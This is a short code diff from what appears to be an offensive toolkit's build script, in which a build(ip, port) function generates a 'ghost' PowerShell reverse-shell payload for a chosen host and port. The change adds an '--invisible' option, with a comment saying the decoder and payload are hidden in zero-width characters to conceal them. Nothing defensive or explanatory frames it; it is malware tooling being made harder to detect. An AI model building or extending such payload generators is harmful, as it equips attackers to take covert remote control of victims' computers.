@@ -71,8 +71,9 @@ def build(ip, port, v3=False):
     log(f"Generating ghost PS1 payload for {ip}:{port}...")
     env = os.environ.copy()
     env["PYTHONIOENCODING"] = "utf-8"
+    # --invisible: decoder+payload both hidden in zero-width chars (Israeli technique)
     r = subprocess.run(
-        [sys.executable, GHOST_SCRIPT, "--shell", ip, port, "-o", ps1_tmp],
+        [sys.executable, GHOST_SCRIPT, "--shell", ip, port, "--invisible", "-o", ps1_tmp],
         cwd=GHOST_DIR, env=env, capture_output=True, text=True
     )
     if not os.path.exists(ps1_tmp):
